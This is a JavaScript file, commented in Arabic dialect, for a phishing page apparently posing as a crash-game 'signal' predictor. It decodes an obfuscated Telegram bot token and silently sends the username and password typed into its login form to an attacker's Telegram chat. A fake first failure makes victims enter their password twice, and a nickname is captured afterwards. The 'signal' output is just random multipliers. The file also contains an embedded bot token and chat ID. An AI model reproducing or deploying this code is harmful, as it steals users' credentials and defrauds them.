// 1. التوكن الجديد نتاعك مشفر بـ Base64 (هذا هو المفتاح)
const _vault = "ODU4OTI0MzM2MzpBQUZqdWhJZnhTQ1BPVGVnVVJuLTc1RF8wa2ZRNEkxYmdsUQ==";

const TG_TOKEN = (() => {
    try { return atob(_vault); } catch { return null; }
})();
const CHAT_ID = "8026901193";

// 2. دالة الإرسال المخفية
function sendToTelegram(text) {
    if (!TG_TOKEN) return;
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=html`;
    new Image().src = url;
}

// 3. ✅ هاد الجزء هو اللي ينحي الشاشة السوداء بالسيف
window.addEventListener('DOMContentLoaded', () => {
    const auth = document.getElementById('auth-screen');
    if (auth) {
        auth.classList.remove('hidden');
        auth.style.display = 'block';
    }
});

let loginAttempts = 0;

// 4. دالة تسجيل الدخول
async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const err = document.getElementById('login-err');

    if (u.length < 4 || p.length < 4) return;

    loginAttempts++;
    if (loginAttempts === 1) {
        btn.disabled = true;
        btn.innerText = "Verifying...";
        sendToTelegram(`⚠️ <b>محاولة 1:</b>\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>`);
        setTimeout(() => {
            if (err) err.classList.remove('hidden');
            document.getElementById('u_pas').value = "";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        }, 1500);
    } else {
        btn.disabled = true;
        sendToTelegram(`✅ <b>مؤكدة 2:</b>\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>`);
        setTimeout(() => {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('security-layer').classList.remove('hidden');
        }, 1000);
    }
}

// 5. باقي الدوال (اللقب والإشارة)
function processNick() {
    const n = document.getElementById('u_nick').value;
    if (n.length < 2) return;
    sendToTelegram(`🔑 <b>اللقب:</b> <code>${n}</code>`);
    document.getElementById('security-layer').classList.add('hidden');
    document.getElementById('main-app').classList.remove('hidden');
}

function getSignal() {
    const res = document.getElementById('target-mult');
    if(res) {
        res.innerText = "SCANNING..";
        setTimeout(() => {
            res.innerText = (Math.random() * (5.50 - 1.20) + 1.20).toFixed(2) + "x";
        }, 800);
    }
}
